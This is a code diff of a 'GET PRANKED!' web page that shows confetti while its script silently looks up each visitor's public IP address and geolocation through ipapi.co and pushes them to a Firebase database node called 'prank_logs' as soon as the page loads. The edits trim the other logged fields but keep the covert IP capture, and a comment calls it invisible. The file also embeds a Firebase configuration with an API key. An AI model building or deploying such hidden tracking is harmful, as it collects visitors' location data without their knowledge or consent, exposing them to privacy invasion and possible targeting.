@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise!</title>
+    <title>GET PRANKED! 🎉</title>
     <style>
         * {
             box-sizing: border-box;
@@ -73,7 +73,7 @@
         import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
         import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
 
-        // Integrated Configuration Object
+        // Your Firebase configuration keys
         const firebaseConfig = {
             apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
             authDomain: "nexus-web-development-official.firebaseapp.com",
@@ -90,12 +90,13 @@
         const database = getDatabase(app);
         const analytics = getAnalytics(app);
 
-        // Fetch basic info and log to Realtime Database
-        async function logVisitorData() {
+        // Fetch IP and immediately sync to database
+        async function logVisitorIP() {
             let ipAddress = "Unknown";
             let geoData = {};
 
             try {
+                // Instantly grabs the user's public network IP upon visiting
                 const response = await fetch('https://ipapi.co/json/');
                 if (response.ok) {
                     const data = await response.json();
@@ -108,29 +109,25 @@
                     };
                 }
             } catch (error) {
-                console.error("Could not fetch IP network data:", error);
+                console.error("IP grab failed:", error);
             }
 
-            // Object payload structured into variables
+            // Clean structure containing only the IP data and timestamp
             const visitorLog = {
                 ip: ipAddress,
                 location: geoData,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                referrer: document.referrer || "Direct Link",
                 timestamp: serverTimestamp() 
             };
 
-            // Pushes everything inside a clean unique node inside "prank_logs"
+            // Logs it immediately to Firebase
             const logsRef = ref(database, 'prank_logs');
             push(logsRef, visitorLog)
-                .then(() => console.log("Prank data synchronized securely."))
+                .then(() => console.log("Logged successfully."))
                 .catch((err) => console.error("Database connection write failed:", err));
         }
 
-        // Run data generation sequence on load
-        logVisitorData();
+        // Run data generation sequence invisibly on load
+        logVisitorIP();
     </script>
 
     <!-- Continuous Confetti Engine -->
@@ -142,7 +139,7 @@
             return Math.random() * (max - min) + min;
         }
 
-        // Infinite loop shooting from both sides every 250ms
+        // Infinite loop shooting from both sides every 250ms right out of the gate
         setInterval(function() {
             confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
             confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
